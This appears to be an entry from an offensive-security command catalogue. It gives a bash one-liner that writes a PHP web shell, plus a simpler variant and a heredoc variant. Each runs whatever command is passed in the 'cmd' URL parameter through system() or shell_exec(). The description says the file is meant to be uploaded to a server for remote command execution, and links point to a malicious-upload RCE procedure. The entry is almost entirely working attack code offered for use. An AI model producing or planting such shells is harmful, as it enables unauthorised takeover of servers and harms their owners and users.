---
id: cmd-create-php-shell-001
data: 'echo ''<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'' > shell.php'
tags:
  - shell
  - php
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:25.053Z'
verified: false
validated: true
submitted: true
---
# create-php-shell

## Command

```bash
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
```

## Description

This command creates a local PHP webshell file that can be uploaded to a server for remote command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo '...'` | Outputs the PHP code string | Yes |
| `> shell.php` | Redirects output to file shell.php | Yes |

## Examples

### Basic Usage

```bash
echo '<?php system($_GET["cmd"]); ?>' > simple_shell.php
```

### Advanced Usage

```bash
cat > advanced_shell.php << EOF
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
EOF
```

## Expected Output

No direct output; creates the file shell.php with the PHP code. Verify with `cat shell.php`.

## Related

- [[commands/curl-php-upload]]
- [[procedures/Upload-Malicious-PHP-File-for-RCE]]
